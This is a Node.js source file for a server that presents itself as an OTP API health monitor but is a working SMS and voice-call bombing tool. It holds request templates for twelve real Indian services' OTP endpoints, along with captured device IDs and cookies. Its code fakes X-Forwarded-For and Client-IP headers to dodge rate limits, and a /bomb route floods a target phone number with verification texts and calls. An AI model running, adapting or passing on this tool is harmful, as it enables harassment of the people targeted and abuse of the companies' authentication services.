// ============================================================
// api_server.js - OTP API Server with Health Logging
// ============================================================

const express = require('express');
const axios = require('axios');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ============================================================
// ===== CONFIG =====
// ============================================================

const BATCH_SIZE = 20;
const BATCH_DELAY = 10;
const API_TIMEOUT = 5000;

// ============================================================
// ===== IP GENERATOR (Random Indian IP) =====
// ============================================================

function randomIndianIP() {
    const prefixes = ['49.', '103.', '106.', '117.', '122.', '182.', '183.', '202.', '203.'];
    const p = prefixes[Math.floor(Math.random() * prefixes.length)];
    return p + Math.floor(Math.random() * 255) + '.' + Math.floor(Math.random() * 255) + '.' + Math.floor(Math.random() * 255);
}

// ============================================================
// ===== API CONFIGS =====
// ============================================================

const API_CONFIGS = [
    {
        name: "Hungama Communication",
        endpoint: "https://communication.api.hungama.com/v1/communication/otp",
        method: "POST",
        payload: {
            "mobileNo": "{{PHONE}}",
            "countryCode": "+91",
            "appCode": "un",
            "messageId": "1",
            "emailId": "",
            "subject": "Register",
            "priority": "1",
            "device": "web",
            "variant": "v1",
            "templateCode": 1
        },
        headers: {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "identifier": "home",
            "mlang": "en",
            "sec-ch-ua-platform": "\"Android\"",
            "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
            "sec-ch-ua-mobile": "?1",
            "alang": "en",
            "country_code": "IN",
            "vlang": "en",
            "origin": "https://www.hungama.com",
            "sec-fetch-site": "same-site",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://www.hungama.com/",
            "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
            "priority": "u=1, i"
        },
        type: "sms"
    },
    {
        name: "Meru Cab",
        endpoint: "https://merucabapp.com/api/otp/generate",
        method: "POST",
        payload: { "mobile_number": "{{PHONE}}" },
        headers: {
            "Mobilenumber": "{{PHONE}}",
            "Mid": "287187234baee1714faa43f25bdf851b3eff3fa9fbdc90d1d249bd03898e3fd9",
            "Oauthtoken": "",
            "AppVersion": "245",
            "ApiVersion": "6.2.55",
            "DeviceType": "Android",
            "DeviceId": "44098bdebb2dc047",
            "Content-Type": "application/x-www-form-urlencoded",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip",
            "User-Agent": "okhttp/4.9.0"
        },
        type: "sms",
        raw: true
    },
    {
        name: "Dayco India",
        endpoint: "https://ekyc.daycoindia.com/api/nscript_functions.php",
        method: "POST",
        payload: { "api": "send_otp", "brand": "dayco", "mob": "{{PHONE}}", "resend_otp": "resend_otp" },
        headers: {
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://ekyc.daycoindia.com",
            "Referer": "https://ekyc.daycoindia.com/verify_otp.php",
            "Cookie": "_ga_E8YSD34SG2=GS1.1.1745236629.1.0.1745236629.60.0.0; PHPSESSID=tbt45qc065ng0cotka6aql88sm;"
        },
        type: "sms",
        raw: true
    },
    {
        name: "Doubtnut",
        endpoint: "https://api.doubtnut.com/v4/student/login",
        method: "POST",
        payload: {
            "app_version": "7.10.51",
            "aaid": "538bd3a8-09c3-47fa-9141-6203f4c89450",
            "course": "",
            "phone_number": "{{PHONE}}",
            "language": "en",
            "udid": "b751fb63c0ae17ba",
            "class": "",
            "gcm_reg_id": "eyZcYS-rT_i4aqYVzlSnBq:APA91bEsUXZ9BeWjN2cFFNP_Sy30-kNIvOUoEZgUWPgxI9svGS6MlrzZxwbp5FD6dFqUROZTqaaEoLm8aLe35Y-ZUfNtP4VluS7D76HFWQ0dglKpIQ3lKvw"
        },
        headers: {
            "version_code": "1160",
            "has_upi": "false",
            "device_model": "ASUS_I005DA",
            "android_sdk_version": "28",
            "content-type": "application/json; charset=utf-8",
            "accept-encoding": "gzip",
            "user-agent": "okhttp/5.0.0-alpha.2"
        },
        type: "sms"
    },
    {
        name: "NoBroker",
        endpoint: "https://www.nobroker.in/api/v3/account/otp/send",
        method: "POST",
        payload: { "phone": "{{PHONE}}", "countryCode": "IN" },
        headers: {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded",
            "origin": "https://www.nobroker.in",
            "referer": "https://www.nobroker.in/"
        },
        type: "sms",
        raw: true
    },
    {
        name: "Shiprocket",
        endpoint: "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
        method: "POST",
        payload: { "mobileNumber": "{{PHONE}}" },
        headers: {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
            "Accept": "application/json",
            "Content-Type": "application/json",
            "authorization": "Bearer null",
            "origin": "https://app.shiprocket.in",
            "referer": "https://app.shiprocket.in/"
        },
        type: "sms"
    },
    {
        name: "Tata Capital (Voice)",
        endpoint: "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
        method: "POST",
        payload: { "phone": "{{PHONE}}", "applSource": "", "isOtpViaCallAtLogin": "true" },
        headers: { "Content-Type": "application/json" },
        type: "call"
    },
    {
        name: "PenPencil",
        endpoint: "https://api.penpencil.co/v1/users/resend-otp?smsType=2",
        method: "POST",
        payload: { "organizationId": "5eb393ee95fab7468a79d189", "mobile": "{{PHONE}}" },
        headers: {
            "content-type": "application/json; charset=utf-8",
            "accept-encoding": "gzip",
            "user-agent": "okhttp/3.9.1"
        },
        type: "sms"
    },
    {
        name: "1MG (Voice)",
        endpoint: "https://www.1mg.com/auth_api/v6/create_token",
        method: "POST",
        payload: { "number": "{{PHONE}}", "is_corporate_user": false, "otp_on_call": true },
        headers: {
            "content-type": "application/json; charset=utf-8",
            "accept-encoding": "gzip",
            "user-agent": "okhttp/3.9.1"
        },
        type: "call"
    },
    {
        name: "Swiggy (Voice)",
        endpoint: "https://profile.swiggy.com/api/v3/app/request_call_verification",
        method: "POST",
        payload: { "mobile": "{{PHONE}}" },
        headers: {
            "user-agent": "Swiggy-Android",
            "accept-encoding": "gzip",
            "accept": "application/json; charset=utf-8",
            "content-type": "application/json; charset=utf-8",
            "pl-version": "55",
            "version-code": "1161",
            "app-version": "4.38.1",
            "latitude": "0.0",
            "longitude": "0.0",
            "os-version": "13",
            "accessibility_enabled": "false",
            "swuid": "4c27ae3a76b146f3",
            "deviceid": "4c27ae3a76b146f3",
            "x-network-quality": "GOOD"
        },
        type: "call"
    },
    {
        name: "KPN Fresh",
        endpoint: "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB&version=1.0.0",
        method: "POST",
        payload: { "phone_number": { "number": "{{PHONE}}", "country_code": "+91" } },
        headers: {
            "cache": "no-store",
            "x-channel-id": "WEB",
            "x-app-id": "d7547338-c70e-4130-82e3-1af74eda6797",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
            "content-type": "application/json",
            "x-user-journey-id": "2fbdb12b-feb8-40f5-9fc7-7ce4660723ae",
            "accept": "*/*",
            "origin": "https://www.kpnfresh.com",
            "referer": "https://www.kpnfresh.com/"
        },
        type: "sms"
    },
    {
        name: "Servetel",
        endpoint: "https://api.servetel.in/v1/auth/otp",
        method: "POST",
        payload: { "mobile_number": "{{PHONE}}" },
        headers: {
            "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 13; Infinix X671B Build/TP1A.220624.014)",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip"
        },
        type: "sms",
        raw: true
    }
];

// ============================================================
// ===== STATS & LOGGING =====
// ============================================================

const stats = {};
const recentLogs = [];
const MAX_LOGS = 200;

API_CONFIGS.forEach(api => {
    stats[api.name] = {
        name: api.name,
        type: api.type,
        total: 0,
        success: 0,
        failed: 0,
        lastStatus: null,
        lastStatusCode: null,
        lastTime: null,
        lastError: null,
        avgResponseTime: 0
    };
});

function logEvent(msg, type = 'info') {
    const emoji = { info: 'ℹ️', success: '✅', error: '❌', warn: '⚠️' }[type] || 'ℹ️';
    console.log(`${emoji} [${new Date().toISOString().slice(11, 19)}] ${msg}`);

    recentLogs.push({
        time: new Date().toISOString(),
        type,
        msg
    });
    if (recentLogs.length > MAX_LOGS) recentLogs.shift();
}

function recordResult(apiName, success, statusCode, responseTime, error = null) {
    const s = stats[apiName];
    if (!s) return;

    s.total++;
    if (success) {
        s.success++;
        s.lastStatus = 'WORKING';
    } else {
        s.failed++;
        s.lastStatus = 'FAILED';
    }
    s.lastStatusCode = statusCode;
    s.lastTime = new Date().toISOString();
    s.lastError = error;
    s.avgResponseTime = s.avgResponseTime === 0
        ? responseTime
        : Math.round((s.avgResponseTime * (s.total - 1) + responseTime) / s.total);
}

// ============================================================
// ===== PAYLOAD BUILDER =====
// ============================================================

function replacePlaceholders(obj, phone) {
    if (typeof obj === 'string') {
        return obj.replace(/\{\{PHONE\}\}/g, phone);
    }
    if (Array.isArray(obj)) {
        return obj.map(item => replacePlaceholders(item, phone));
    }
    if (typeof obj === 'object' && obj !== null) {
        const out = {};
        for (const key in obj) {
            out[key] = replacePlaceholders(obj[key], phone);
        }
        return out;
    }
    return obj;
}

function buildFormData(obj) {
    const parts = [];
    for (const key in obj) {
        const val = obj[key];
        if (val === null || val === undefined) continue;
        parts.push(encodeURIComponent(key) + '=' + encodeURIComponent(val));
    }
    return parts.join('&');
}

// ============================================================
// ===== API CALL =====
// ============================================================

async function callAPI(api, phone) {
    const startTime = Date.now();
    const ip = randomIndianIP();

    try {
        // Build headers
        const headers = { ...api.headers };
        for (const key in headers) {
            if (typeof headers[key] === 'string') {
                headers[key] = headers[key].replace(/\{\{PHONE\}\}/g, phone);
            }
        }
        // Add spoofed IP
        headers['X-Forwarded-For'] = ip;
        headers['Client-IP'] = ip;

        // Build payload
        let data;
        const contentType = headers['Content-Type'] || headers['content-type'] || '';

        if (api.raw || contentType.includes('x-www-form-urlencoded')) {
            const replaced = replacePlaceholders(api.payload, phone);
            data = buildFormData(replaced);
        } else {
            data = JSON.stringify(replacePlaceholders(api.payload, phone));
        }

        const config = {
            method: api.method,
            url: api.endpoint,
            headers: headers,
            timeout: API_TIMEOUT,
            validateStatus: () => true // Don't throw on HTTP errors
        };

        if (api.method === 'POST') {
            config.data = data;
        }

        const response = await axios(config);
        const responseTime = Date.now() - startTime;

        // Consider 2xx and 4xx as "API is alive" (server responded)
        // 5xx = API down
        // Network errors = down
        const isAlive = response.status < 500;
        const isSuccess = response.status >= 200 && response.status < 300;

        if (isAlive) {
            recordResult(api.name, true, response.status, responseTime);
            if (isSuccess) {
                logEvent(`${api.name} → ${response.status} (${responseTime}ms) ✅`, 'success');
            } else {
                logEvent(`${api.name} → ${response.status} (${responseTime}ms) [alive]`, 'warn');
            }
            return { success: true, status: response.status, responseTime };
        } else {
            recordResult(api.name, false, response.status, responseTime, `HTTP ${response.status}`);
            logEvent(`${api.name} → ${response.status} (${responseTime}ms) ❌`, 'error');
            return { success: false, status: response.status, responseTime };
        }
    } catch (err) {
        const responseTime = Date.now() - startTime;
        const errMsg = err.code || err.message || 'Unknown';
        recordResult(api.name, false, null, responseTime, errMsg);
        logEvent(`${api.name} → FAIL (${responseTime}ms) ${errMsg}`, 'error');
        return { success: false, status: null, responseTime, error: errMsg };
    }
}

// ============================================================
// ===== ROUTES =====
// ============================================================

// Root - server status
app.get('/', (req, res) => {
    res.json({
        status: 'ok',
        instance: process.env.INSTANCE_NAME || 'api-server',
        totalAPIs: API_CONFIGS.length,
        uptime: Math.round(process.uptime()) + 's'
    });
});

// Health check
app.get('/health', (req, res) => {
    res.json({
        status: 'ok',
        uptime: process.uptime(),
        apis: API_CONFIGS.length
    });
});

// Test all APIs with a single number (for checking which work)
app.get('/test', async (req, res) => {
    const phone = req.query.phone || '9999999999';
    logEvent(`🧪 Testing all APIs with ${phone}...`, 'info');

    const results = [];
    for (const api of API_CONFIGS) {
        const r = await callAPI(api, phone);
        results.push({
            name: api.name,
            type: api.type,
            endpoint: api.endpoint,
            ...r
        });
        await new Promise(r => setTimeout(r, 300)); // small gap
    }

    const working = results.filter(r => r.success).length;
    const failed = results.length - working;

    logEvent(`🧪 Test complete: ${working} working, ${failed} failed`, working > 0 ? 'success' : 'error');

    res.json({
        phone,
        total: results.length,
        working,
        failed,
        results
    });
});

// Test a single API
app.get('/test-one', async (req, res) => {
    const apiName = req.query.name;
    const phone = req.query.phone || '9999999999';

    const api = API_CONFIGS.find(a => a.name.toLowerCase() === (apiName || '').toLowerCase());
    if (!api) {
        return res.status(404).json({ error: 'API not found. Use /apis to list.' });
    }

    const r = await callAPI(api, phone);
    res.json({ name: api.name, ...r });
});

// List all APIs
app.get('/apis', (req, res) => {
    res.json({
        total: API_CONFIGS.length,
        apis: API_CONFIGS.map(a => ({
            name: a.name,
            type: a.type,
            endpoint: a.endpoint,
            method: a.method
        }))
    });
});

// Stats - which APIs are working
app.get('/stats', (req, res) => {
    const arr = Object.values(stats).map(s => ({
        name: s.name,
        type: s.type,
        total: s.total,
        success: s.success,
        failed: s.failed,
        successRate: s.total > 0 ? ((s.success / s.total) * 100).toFixed(1) + '%' : 'N/A',
        status: s.lastStatus || 'NEVER TESTED',
        lastStatusCode: s.lastStatusCode,
        lastTime: s.lastTime,
        lastError: s.lastError,
        avgResponseTime: s.avgResponseTime + 'ms'
    }));

    const workingCount = arr.filter(a => a.status === 'WORKING').length;
    const failedCount = arr.filter(a => a.status === 'FAILED').length;
    const untestedCount = arr.filter(a => a.status === 'NEVER TESTED').length;

    res.json({
        summary: {
            total: arr.length,
            working: workingCount,
            failed: failedCount,
            untested: untestedCount
        },
        apis: arr
    });
});

// Recent logs
app.get('/logs', (req, res) => {
    res.json({
        count: recentLogs.length,
        logs: recentLogs.slice(-50).reverse()
    });
});

// Reset stats
app.get('/reset-stats', (req, res) => {
    for (const key in stats) {
        stats[key] = {
            name: stats[key].name,
            type: stats[key].type,
            total: 0,
            success: 0,
            failed: 0,
            lastStatus: null,
            lastStatusCode: null,
            lastTime: null,
            lastError: null,
            avgResponseTime: 0
        };
    }
    recentLogs.length = 0;
    logEvent('Stats reset', 'warn');
    res.json({ success: true, message: 'Stats reset' });
});

// Bomb endpoint (for bot.js)
app.post('/bomb', async (req, res) => {
    const { phone, duration, instance } = req.body;

    if (!phone || phone.length !== 10) {
        return res.status(400).json({ error: 'Invalid phone number. Must be 10 digits.' });
    }

    logEvent(`📱 BOMB REQUEST | phone=${phone} | duration=${duration || 'default'} | instance=${instance || 'default'}`, 'info');

    try {
        const startTime = Date.now();

        // Shuffle APIs
        const shuffled = [...API_CONFIGS];
        for (let i = shuffled.length - 1; i > 0; i--) {
            const j = Math.floor(Math.random() * (i + 1));
            [shuffled[i], shuffled[j]] = [shuffled[j], shuffled[i]];
        }

        let success = 0, smsCount = 0, callCount = 0;
        const results = [];

        for (const api of shuffled) {
            const r = await callAPI(api, phone);
            if (r.success) {
                success++;
                if (api.type === 'call') callCount++;
                else smsCount++;
            }
            results.push({ name: api.name, ...r });
            await new Promise(r => setTimeout(r, BATCH_DELAY));
        }

        const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
        logEvent(`📱 BOMB DONE | ${phone} | sent=${success} | sms=${smsCount} | calls=${callCount} | ${elapsed}s`, success > 0 ? 'success' : 'error');

        res.json({
            success: true,
            phone,
            duration: duration || 'default',
            instance: instance || 'default',
            totalSent: success,
            sms: smsCount,
            calls: callCount,
            whatsapp: 0,
            elapsed: elapsed + 's',
            details: results
        });
    } catch (error) {
        logEvent(`📱 BOMB ERROR | ${phone} | ${error.message}`, 'error');
        res.status(500).json({ error: error.message });
    }
});

// ============================================================
// ===== START SERVER =====
// ============================================================

const PORT = process.env.PORT || 10000;

app.listen(PORT, '0.0.0.0', () => {
    console.log('═══════════════════════════════════════════');
    console.log(`🚀 API Server Started on port ${PORT}`);
    console.log(`📡 Instance: ${process.env.INSTANCE_NAME || 'default'}`);
    console.log(`📊 APIs Loaded: ${API_CONFIGS.length}`);
    console.log('═══════════════════════════════════════════');
    console.log('📋 Endpoints:');
    console.log('   GET  /              - Server status');
    console.log('   GET  /health        - Health check');
    console.log('   GET  /apis          - List all APIs');
    console.log('   GET  /test?phone=X  - Test ALL APIs with a number');
    console.log('   GET  /test-one?name=X&phone=Y - Test single API');
    console.log('   GET  /stats         - Show working/failed APIs');
    console.log('   GET  /logs          - Recent activity logs');
    console.log('   GET  /reset-stats   - Clear stats');
    console.log('   POST /bomb          - Trigger bombing');
    console.log('═══════════════════════════════════════════');
    API_CONFIGS.forEach((api, i) => {
        console.log(`   ${i + 1}. [${api.type.toUpperCase()}] ${api.name}`);
    });
    console.log('═══════════════════════════════════════════');
});
